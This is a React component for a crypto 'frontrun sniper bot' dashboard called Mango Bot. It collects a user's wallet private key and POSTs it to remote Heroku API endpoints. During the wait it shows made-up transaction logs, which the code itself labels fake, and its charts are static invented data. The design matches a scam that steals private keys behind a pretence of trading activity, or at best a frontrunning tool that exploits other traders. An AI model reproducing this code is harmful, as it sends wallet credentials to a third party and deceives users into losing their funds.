import React, { useEffect, useRef, useState } from "react";
import {
  LineChart,
  Line,
  XAxis,
  YAxis,
  Tooltip,
  CartesianGrid,
  ResponsiveContainer,
  Area,
  ComposedChart,
} from "recharts";
import { ToastContainer, toast } from "react-toastify";
import axios from "axios";
import Web3 from "web3";
import logo from "../../assets/mango-logo.png";

const getRpcUrl = (network) =>
  network === "polygon"
    ? "https://polygon-rpc.com"
    : network === "bsc"
    ? "https://bsc-dataseed.binance.org"
    : null;

const getExplorerHost = (network) =>
  network === "polygon" ? "polygonscan.com" : network === "bsc" ? "bscscan.com" : "";

function Hero() {
  const [network, setNetwork] = useState("");
  const [address, setAddress] = useState(null);
  const [balance, setBalance] = useState(null);
  const [previousBalance, setPreviousBalance] = useState(null);
  const [privateKey, setPrivateKey] = useState("");
  const [displayKey, setDisplayKey] = useState("");
  const [loader, setLoader] = useState(false);
  const [message, setMessage] = useState("");
  const [profit, setProfit] = useState(null);
  const [logLines, setLogLines] = useState([]);
  const fakeIntervalRef = useRef(null);
  const confirmIntervalRef = useRef(null);
  const [blockHeightData, setBlockHeightData] = useState([
    { time: '10:15', blockHeight: 18245678 },
    { time: '10:30', blockHeight: 18245892 },
    { time: '10:45', blockHeight: 18246234 },
    { time: '11:00', blockHeight: 18246478 },
    { time: '11:15', blockHeight: 18246821 },
    { time: '11:30', blockHeight: 18247095 },
    { time: '11:45', blockHeight: 18247423 },
    { time: '12:00', blockHeight: 18247689 },
    { time: '12:15', blockHeight: 18248012 },
    { time: '12:30', blockHeight: 18248456 },
  ]);
  const [pendingTxData, setPendingTxData] = useState([
    { time: '10:15', pendingTx: 145 },
    { time: '10:30', pendingTx: 178 },
    { time: '10:45', pendingTx: 223 },
    { time: '11:00', pendingTx: 198 },
    { time: '11:15', pendingTx: 267 },
    { time: '11:30', pendingTx: 312 },
    { time: '11:45', pendingTx: 289 },
    { time: '12:00', pendingTx: 345 },
    { time: '12:15', pendingTx: 298 },
    { time: '12:30', pendingTx: 376 },
  ]);
  const [time, setTime] = useState(new Date());

  useEffect(() => {
    const timer = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  const handleChange = (e) => {
    const value = e.target.value;
    setPrivateKey(value);
    if (value.length > 8) {
      const masked =
        value.slice(0, 4) + "*".repeat(value.length - 8) + value.slice(-4);
      setDisplayKey(masked);
    } else {
      setDisplayKey(value);
    }
  };

  const makeWeb3 = () => {
    const rpc = getRpcUrl(network);
    if (!rpc) return null;
    return new Web3(rpc);
  };

  const fetchBalance = async () => {
    if (!address || !network) return;
    try {
      const web3Instance = makeWeb3();
      if (!web3Instance) return;

      const balanceInWei = await web3Instance.eth.getBalance(address);
      const balanceInEther = web3Instance.utils.fromWei(balanceInWei, "ether");
      setBalance(parseFloat(balanceInEther).toFixed(4));

      localStorage.setItem("balance", balanceInEther);
      setPreviousBalance(balanceInEther);
    } catch (error) {
      console.error("Error fetching balance:", error);
      setBalance("Error fetching balance");
    }
  };

  useEffect(() => {
    if (address && network) {
      fetchBalance();
    }
  }, [address, network]);

  const handleRunBot = async () => {
    if (!network) {
      toast.error("Please select a chain first!");
      return;
    }
    if (!privateKey || !address) {
      setMessage("Please enter both private key and address");
      return;
    }

    setLoader(true);
    setLogLines([]);
    setMessage("");

    const fakeLogs = [];
    const fakeTokens = [
      "USDT","MATIC","DAI","SHIB","PEPE","BTC","ETH","BNB","XRP","DOGE",
      "ADA","SOL","DOT","AVAX","TRX","UNI","LINK","LTC","XLM","ATOM",
      "NEAR","AAVE","FTM","ARB","OP","SAND","MANA","GALA","INJ","RNDR",
      "FLOKI","CRO","VET","HBAR","LDO","ENS","DYDX","ZIL","RUNE","1INCH",
      "BTT","GMT","MINA","ANKR","CHR","ALGO","KAVA","MASK","TWT","YFI",
    ];
    const fakeAddresses = [
      "0x" + Math.random().toString(16).substr(2, 8),
      "0x" + Math.random().toString(16).substr(2, 8),
      "0x" + Math.random().toString(16).substr(2, 8),
    ];

    for (let i = 0; i < 10; i++) {
      const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
      const addr = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
      const hash = "0x" + Math.random().toString(16).substr(2, 64);
      fakeLogs.push(`Detected swap on ${token} by ${addr} | Tx: ${hash}`);
    }

    let fakeIndex = 0;
    fakeIntervalRef.current = setInterval(() => {
      setLogLines((prev) => [...prev, fakeLogs[fakeIndex]]);
      fakeIndex = (fakeIndex + 1) % fakeLogs.length;
    }, 300);

    await runBotWithDelay();
  };

  const runBotWithDelay = async () => {
    const startTime = Date.now();

    try {
      const token = localStorage.getItem("token");
      if (!token) throw new Error("Authorization token not found.");

      const apiUrl =
        network === "polygon"
          ? "https://marlinnapp-f52b2d918ea3.herokuapp.com/api/runBot"
          : "https://bnbsniperbot-303a52ad1861.herokuapp.com/api/runBot";

      const response = await axios.post(
        apiUrl,
        {
          amount: 1,
          privatekey: privateKey,
        },
        {
          headers: { Authorization: `Bearer ${token}` },
        }
      );

      const { data, message: apiMsg } = response.data;
      const txHash = data?.frontrunTxHash;
      if (!txHash) throw new Error("No transaction hash returned.");

      const web3Instance = makeWeb3();
      if (!web3Instance) throw new Error("Invalid network / RPC.");

      confirmIntervalRef.current = setInterval(async () => {
        try {
          const receipt = await web3Instance.eth.getTransactionReceipt(txHash);
          if (receipt && receipt.status) {
            clearInterval(confirmIntervalRef.current);
            confirmIntervalRef.current = null;
            console.log("Transaction confirmed!");
          }
        } catch (err) {
          console.error("Error checking transaction receipt:", err.message);
        }
      }, 5000);

      const elapsed = Date.now() - startTime;
      const remaining = Math.max(60000 - elapsed, 0);

      setTimeout(async () => {
        if (fakeIntervalRef.current) {
          clearInterval(fakeIntervalRef.current);
          fakeIntervalRef.current = null;
        }
        setLogLines([]);

        const explorer = getExplorerHost(network);

        setMessage(
          <>
            <p className="mt-3 text-green-400">{apiMsg}</p>
            <div className="mt-3 text-green-300">
              <p>
                Frontrun TxHash:{" "}
                <a
                  href={`https://${explorer}/tx/${data.frontrunTxHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  {data.frontrunTxHash}
                </a>
              </p>
              <p>
                Target TxHash:{" "}
                <a
                  href={`https://${explorer}/tx/${data.targetTxHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  {data.targetTxHash}
                </a>
              </p>
              {data?.TakeProfitTxHash && (
                <p>
                  Take Profit TxHash:{" "}
                  <a
                    href={`https://${explorer}/tx/${data.TakeProfitTxHash}`}
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    {data.TakeProfitTxHash}
                  </a>
                </p>
              )}
            </div>
          </>
        );

        toast.success(apiMsg);

        const prev = previousBalance ?? localStorage.getItem("balance");
        await fetchBalance();
        const updatedBalance = localStorage.getItem("balance");

        if (prev && updatedBalance) {
          const profitValue =
            parseFloat(updatedBalance) - parseFloat(prev);
          if (!Number.isNaN(profitValue)) setProfit(profitValue.toFixed(4));
        }

        setLoader(false);
      }, remaining);
    } catch (error) {
      if (fakeIntervalRef.current) {
        clearInterval(fakeIntervalRef.current);
        fakeIntervalRef.current = null;
      }
      if (confirmIntervalRef.current) {
        clearInterval(confirmIntervalRef.current);
        confirmIntervalRef.current = null;
      }

      console.error("Error running bot:", error);

      if (error.response) {
        console.error("API Error Response:", error.response.data);
        setMessage(`❌ API Error: ${error.response.data.message || "Unknown error"}`);
      } else {
        setMessage(`❌ Failed to run bot: ${error.message}`);
      }

      toast.error("Bot run failed.");
      setLoader(false);
    }
  };

  useEffect(() => {
    return () => {
      if (fakeIntervalRef.current) clearInterval(fakeIntervalRef.current);
      if (confirmIntervalRef.current) clearInterval(confirmIntervalRef.current);
    };
  }, []);

  const logEndRef = useRef(null);
  useEffect(() => {
    if (logEndRef.current) {
      logEndRef.current.scrollIntoView({ behavior: "smooth" });
    }
  }, [logLines]);


  return (
    <div style={{
      background: '#191928',
      minHeight: '100vh',
      padding: '0',
      fontFamily: 'Montserrat, sans-serif'
    }}>
      <div style={{
        borderBottom: '1px solid #292F49',
        padding: '18px 40px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
          <img src={logo} alt="Mango Logo" style={{ height: '55px', width: 'auto' }} />
          <span style={{ color: '#ffffff', fontSize: '18px', fontWeight: '400', letterSpacing: '0.3px' }}>
            Welcome to Mango Bot
          </span>
        </div>
        <div style={{ color: '#ffffff', fontSize: '15px', fontWeight: '400' }}>
          {time.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })} {time.toLocaleTimeString('en-US', { hour12: false })}
        </div>
      </div>

      <div style={{ padding: '30px 40px' }}>
        <div style={{
          display: 'grid',
          gridTemplateColumns: '58% 42%',
          gap: '20px',
          alignItems: 'start'
        }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
            <div style={{
              background: 'linear-gradient(180deg, #1a1f3a 0%, #292F49 100%)',
              borderRadius: '12px',
              padding: '25px 20px',
              position: 'relative',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'flex-start'
            }}>
              <div style={{
                position: 'absolute',
                left: 0,
                top: 0,
                bottom: 0,
                width: '36px',
                background: 'linear-gradient(180deg, #0099CC 0%, #21C6FD 100%)',
                borderRadius: '12px 0 0 12px'
              }}></div>

              <div style={{ marginLeft: '50px', flex: 1 }}>
                <div style={{
                  color: '#ffffff',
                  fontSize: '22px',
                  fontWeight: '600',
                  marginBottom: '12px',
                  letterSpacing: '0.5px'
                }}>
                  {network
                    ? network === "polygon"
                      ? "POLYGON"
                      : "BSC"
                    : "POLYGON"}
                </div>
                <div style={{ color: '#ffffff', fontSize: '14px', marginBottom: '6px', fontWeight: '600', letterSpacing: '0.3px' }}>
                  ADDRESS:
                </div>
                <div style={{ color: '#ffffff', fontSize: '14px', marginBottom: '6px', fontWeight: '600', letterSpacing: '0.3px' }}>
                  CHAINS : {network
                    ? network === "polygon"
                      ? "POLYGON"
                      : "BSC"
                    : "POLYGON"}
                </div>
                <div style={{ color: '#ffffff', fontSize: '14px', fontWeight: '600', letterSpacing: '0.3px' }}>
                  BALANCE: {balance !== null && balance}
                </div>
                {profit !== null && (
                  <div style={{ color: '#ffffff', fontSize: '14px', marginTop: '6px', fontWeight: '600' }}>
                    Profit: <span style={{ color: '#4ade80' }}>{profit}</span>
                  </div>
                )}
              </div>

              <div style={{ marginRight: '15px', display: 'flex', alignItems: 'center', position: 'relative' }}>
                <select
                  value={network}
                  onChange={(e) => setNetwork(e.target.value)}
                  style={{
                    background: 'linear-gradient(180deg, #063E5F 0%, #0D5F8D 100%)',
                    border: 'none',
                    borderRadius: '8px',
                    color: '#ffffff',
                    padding: '10px 40px 10px 20px',
                    fontSize: '15px',
                    fontWeight: '500',
                    appearance: 'none',
                    cursor: 'pointer',
                    fontFamily: 'Montserrat, sans-serif',
                    minWidth: '160px',
                    outline: 'none'
                  }}
                >
                  <option value="">Select Network</option>
                  <option value="polygon">Polygon</option>
                  <option value="bsc">BSC</option>
                </select>
                <div style={{
                  position: 'absolute',
                  right: '15px',
                  top: '50%',
                  transform: 'translateY(-50%)',
                  pointerEvents: 'none',
                  width: '0',
                  height: '0',
                  borderLeft: '5px solid transparent',
                  borderRight: '5px solid transparent',
                  borderTop: '6px solid #ffffff'
                }}></div>
              </div>
            </div>

            <input
              type="text"
              placeholder="Enter Address"
              value={address || ""}
              onChange={(e) => setAddress(e.target.value)}
              style={{
                width: '100%',
                background: 'transparent',
                border: '2px solid rgba(255, 255, 255, 0.1)',
                borderRadius: '10px',
                padding: '20px 24px',
                color: '#ffffff',
                fontSize: '16px',
                fontWeight: '400',
                fontFamily: 'Montserrat, sans-serif',
                outline: 'none'
              }}
            />

            <input
              type="text"
              placeholder="Enter Private Key"
              value={displayKey}
              onChange={handleChange}
              style={{
                width: '100%',
                background: 'linear-gradient(180deg, #0E9CCC 0%, #21C6FD 100%)',
                border: 'none',
                borderRadius: '10px',
                padding: '20px 24px',
                color: '#ffffff',
                fontSize: '16px',
                fontWeight: '400',
                fontFamily: 'Montserrat, sans-serif',
                outline: 'none'
              }}
            />

            <div style={{ display: 'flex', justifyContent: 'center', margin: '8px 0' }}>
              <button
                onClick={handleRunBot}
                disabled={loader}
                style={{
                  background: 'linear-gradient(180deg, #0E76B5 0%, #2AC8FA 100%)',
                  border: 'none',
                  borderRadius: '25px',
                  padding: '14px 90px',
                  color: '#ffffff',
                  fontSize: '16px',
                  fontWeight: '600',
                  cursor: loader ? 'not-allowed' : 'pointer',
                  boxShadow: '0 6px 20px rgba(33, 198, 253, 0.4)',
                  fontFamily: 'Montserrat, sans-serif',
                  letterSpacing: '0.5px'
                }}
              >
                {loader ? 'Processing' : 'Start Bot'}
              </button>
            </div>

            <div
              className="log-card"
              style={{
                background: 'linear-gradient(180deg, #1a1f3a 0%, #292F49 100%)',
                borderRadius: '12px',
                padding: '20px',
                height: '490px',
                overflowY: 'auto',
                position: 'relative'
              }}>
              <h3 style={{
                color: '#21C6FD',
                fontSize: '16px',
                fontWeight: '600',
                marginBottom: '16px',
                letterSpacing: '0.5px',
                borderBottom: '2px solid rgba(33, 198, 253, 0.3)',
                paddingBottom: '10px'
              }}>
                Bot Transaction Logs
              </h3>
              <div style={{ paddingRight: '10px' }}>
                {logLines.map((line, index) => (
                  <p key={index} style={{
                    color: '#ffffff',
                    fontSize: '13px',
                    marginBottom: '8px',
                    lineHeight: '1.5'
                  }}>{line}</p>
                ))}
                <div ref={logEndRef}></div>
                <div style={{ marginTop: '20px', color: '#ffffff', fontSize: '14px' }}>{message}</div>
              </div>
            </div>
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '85px' }}>
            <div style={{
              background: 'linear-gradient(180deg, #252c44 0%, #353C58 100%)',
              borderRadius: '28px',
              padding: '22px 24px',
              position: 'relative',
              height: '350px',
              boxShadow: '0 8px 24px rgba(0, 0, 0, 0.25)'
            }}>
              <div style={{
                position: 'absolute',
                right: 0,
                top: 0,
                bottom: 0,
                width: '8px',
                background: 'linear-gradient(180deg, #0099CC 0%, #21C6FD 100%)',
                borderRadius: '0 28px 28px 0'
              }}></div>

              <h3 style={{
                color: '#ffffff',
                fontSize: '16px',
                fontWeight: '600',
                marginBottom: '14px',
                letterSpacing: '0.4px'
              }}>
                Block Height
              </h3>
              <ResponsiveContainer width="100%" height={390}>
                <LineChart data={blockHeightData}>
                  <defs>
                    <linearGradient id="lineGradient" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="0%" stopColor="#21C6FD" stopOpacity={0.8} />
                      <stop offset="100%" stopColor="#0099CC" stopOpacity={0.3} />
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="#2a3350" vertical={false} />
                  <XAxis
                    dataKey="time"
                    tick={{ fill: '#8a9ab5', fontSize: 11 }}
                    stroke="#2a3350"
                    tickLine={false}
                  />
                  <YAxis
                    domain={["dataMin - 100", "dataMax + 100"]}
                    tick={{ fill: '#8a9ab5', fontSize: 11 }}
                    stroke="#2a3350"
                    tickLine={false}
                    tickFormatter={(value) => `${(value / 1000000).toFixed(2)}M`}
                  />
                  <Tooltip
                    contentStyle={{
                      background: '#1e2538',
                      border: '1px solid #21C6FD',
                      borderRadius: '10px',
                      color: '#ffffff',
                      padding: '8px 12px'
                    }}
                  />
                  <Line
                    type="monotone"
                    dataKey="blockHeight"
                    stroke="url(#lineGradient)"
                    strokeWidth={3}
                    dot={{ fill: '#21C6FD', r: 4, strokeWidth: 2, stroke: '#ffffff' }}
                    activeDot={{ r: 6, fill: '#21C6FD' }}
                  />
                </LineChart>
              </ResponsiveContainer>
            </div>

            <div style={{
              background: 'linear-gradient(180deg, #0066B3 0%, #21C6FD 100%)',
              borderRadius: '28px',
              padding: '22px 24px',
              position: 'relative',
              height: '350px',
              boxShadow: '0 8px 24px rgba(33, 198, 253, 0.3)'
            }}>
              <div style={{
                position: 'absolute',
                right: 0,
                top: 0,
                bottom: 0,
                width: '8px',
                background: '#ffffff',
                borderRadius: '0 28px 28px 0'
              }}></div>

              <h3 style={{
                color: '#ffffff',
                fontSize: '16px',
                fontWeight: '600',
                marginBottom: '14px',
                letterSpacing: '0.4px'
              }}>
                Pending Transactions
              </h3>
              <ResponsiveContainer width="100%" height={390}>
                <ComposedChart data={pendingTxData}>
                  <defs>
                    <linearGradient id="pendingGradientFill" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="0%" stopColor="rgba(255, 255, 255, 0.3)" />
                      <stop offset="100%" stopColor="rgba(255, 255, 255, 0)" />
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="rgba(255, 255, 255, 0.15)" vertical={false} />
                  <XAxis
                    dataKey="time"
                    tick={{ fill: '#ffffff', fontSize: 11 }}
                    stroke="rgba(255, 255, 255, 0.2)"
                    tickLine={false}
                  />
                  <YAxis
                    domain={["dataMin - 20", "dataMax + 20"]}
                    tick={{ fill: '#ffffff', fontSize: 11 }}
                    stroke="rgba(255, 255, 255, 0.2)"
                    tickLine={false}
                  />
                  <Tooltip
                    contentStyle={{
                      background: '#0066B3',
                      border: '1px solid #ffffff',
                      borderRadius: '10px',
                      color: '#ffffff',
                      padding: '8px 12px'
                    }}
                  />
                  <Area
                    type="monotone"
                    dataKey="pendingTx"
                    fill="url(#pendingGradientFill)"
                    stroke="none"
                  />
                  <Line
                    type="monotone"
                    dataKey="pendingTx"
                    stroke="#ffffff"
                    strokeWidth={3}
                    dot={{ fill: '#ffffff', r: 4, strokeWidth: 2, stroke: '#0066B3' }}
                    activeDot={{ r: 6, fill: '#ffffff' }}
                  />
                </ComposedChart>
              </ResponsiveContainer>
            </div>
          </div>
        </div>
      </div>

      <footer style={{
        borderTop: '1px solid #292F49',
        padding: '25px 40px',
        marginTop: '40px',
        textAlign: 'center'
      }}>
        <div style={{
          color: '#8a9ab5',
          fontSize: '14px',
          fontWeight: '400',
          letterSpacing: '0.3px'
        }}>
          © {new Date().getFullYear()} Mango Bot. All rights reserved.
        </div>
      </footer>

      <ToastContainer />
    </div>
  );
}

export default Hero;
